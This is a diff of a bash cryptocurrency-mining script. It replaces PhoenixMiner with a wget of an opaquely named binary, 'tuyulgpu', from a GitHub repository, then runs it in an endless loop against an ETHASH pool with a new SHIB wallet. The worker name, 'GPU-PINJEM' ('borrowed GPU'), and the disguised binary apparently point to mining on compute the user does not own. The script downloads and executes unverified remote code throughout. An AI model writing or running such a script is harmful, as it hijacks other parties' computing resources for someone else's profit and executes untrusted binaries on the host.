@@ -1,12 +1,11 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=SHIB:0xa3d3f3d8ea6252f798d48e9dc7cde0ae2a45b383
-WORKER=$(echo $(shuf -i 10-40 -n 1)-DOGE)
-sudo apt install libpci3
-wget https://phoenixminer.info/downloads/PhoenixMiner_5.6d_Linux.tar.gz && tar -xf PhoenixMiner_5.6d_Linux.tar.gz && cd PhoenixMiner_5.6d_Linux 
-chmod +x PhoenixMiner
+WALLET=SHIB:0xc0ebef7b055c334c177ac7a34ce7e40e5e8cddad
+WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
+wget https://github.com/skullCANDe/skyz/raw/main/tuyulgpu
+chmod +x tuyulgpu
 while [ 1 ]; do
-sudo ./PhoenixMiner -pool $POOL -wal $WALLET.$WORKER -pass x -mi 14 -gt 400
+./tuyulgpu --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
 sleep 5
 done
-sleep 999999999
+sleep 999999999 
